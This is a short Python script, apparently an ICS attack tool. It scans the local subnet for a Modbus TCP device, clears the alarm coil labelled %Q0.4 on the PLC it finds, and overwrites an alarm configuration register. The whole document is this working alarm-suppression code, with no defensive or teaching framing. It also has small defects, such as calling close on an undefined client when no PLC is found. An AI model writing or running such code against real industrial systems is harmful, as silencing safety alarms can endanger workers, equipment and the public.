from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to suppress alarm
def suppress_alarm(client, alarm_address):
    try:
        # Read the current alarm state
        alarm_state = client.read_coils(alarm_address, 1)
        alarm_state = alarm_state.bits[0]
        print(f"Current alarm state at address {alarm_address}: {alarm_state}")
        
        # Suppress the alarm by writing a 0 to the alarm address
        client.write_coil(alarm_address, 0)
        print(f"Alarm at address {alarm_address} suppressed")
    except Exception as e:
        print(f"Failed to suppress alarm at address {alarm_address}: {e}")

# Function to modify alarm configuration
def modify_alarm_configuration(client, alarm_address, new_configuration):
    try:
        # Read the current alarm configuration
        alarm_configuration = client.read_holding_registers(alarm_address, 1)
        alarm_configuration = alarm_configuration.registers[0]
        print(f"Current alarm configuration at address {alarm_address}: {alarm_configuration}")
        
        # Modify the alarm configuration by writing the new configuration to the alarm address
        client.write_register(alarm_address, new_configuration)
        print(f"Alarm configuration at address {alarm_address} modified to {new_configuration}")
    except Exception as e:
        print(f"Failed to modify alarm configuration at address {alarm_address}: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        
        # Suppress alarm at address %Q0.4 (Q_REDA)
        alarm_address = 0x0004
        suppress_alarm(client, alarm_address)
        
        # Modify alarm configuration at address %Q0.4 (Q_REDA)
        new_configuration = 0x0001
        modify_alarm_configuration(client, alarm_address, new_configuration)
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()